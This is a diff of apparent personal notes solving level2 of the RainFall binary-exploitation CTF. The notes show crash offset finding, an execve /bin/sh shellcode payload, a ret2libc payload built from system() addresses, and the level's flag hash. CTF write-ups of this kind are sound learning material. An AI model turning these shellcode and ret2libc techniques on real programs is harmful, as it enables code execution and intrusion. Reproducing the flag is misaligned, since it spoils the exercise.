@@ -7,21 +7,7 @@ python -c 'print "A" * 100' | ./level2
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 ```
 find where exactly does it crash
-```
-./pattern create 300
-Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
 
-SIGSEGV in 0xb7ea4478 in ??
-```
-
-```
-run <<< $(python -c 'print ("-" * 80 + "AAAA")')
-
-"\x08\x04\x84\xe2"[::-1]
-
-$(python -c 'print "-" * 80 + "\x08\x04\x84\xe2"[::-1] ')
-```
-there is no system() therefore no shell to jump to
 ```
 cyclic 100
 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
@@ -96,6 +82,8 @@ x/2i $eip
 end
 ```
 
+there is no system() therefore no shell to jump to
+
 ===
 
 ```
@@ -105,6 +93,7 @@ python3 -c 'print (len("\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69
 
 80 - 21 = 59
 ```
+
 ```
 level2@RainFall:~$ (python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 59 + "\x08\x04\xa0\x08"[::-1]'; cat) | ./level2
 
@@ -145,13 +134,13 @@ https://tc.gts3.org/cs6265/2019/tut/tut09-01-heap.html
 ```
 first apperance of 'a' = 
 
-(gdb) p/x 0x804a000 + 8 = 0x804a008
+`(gdb) p/x 0x804a000 + 8 = 0x804a008`
  
  =====
  
  ret2libc
  
- 
+ ```
  ret of p() func  0x0804853e to bypass check
  
  (gdb) p system ==> 0xb7e6b060
@@ -162,9 +151,8 @@ first apperance of 'a' =
  
  level2@RainFall:~$ python -c 'print "A" * 80 + "\x08\x04\x85\x3e"[::-1] + "\xb7\xe6\xb0\x60"[::-1] + "AAAA" + "\xb7\xf8\xcc\x58"[::-1] ' > /tmp/payload
  
- 
  (cat /tmp/payload ; cat) | ./level2
  
  492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
- 
+ ```
 
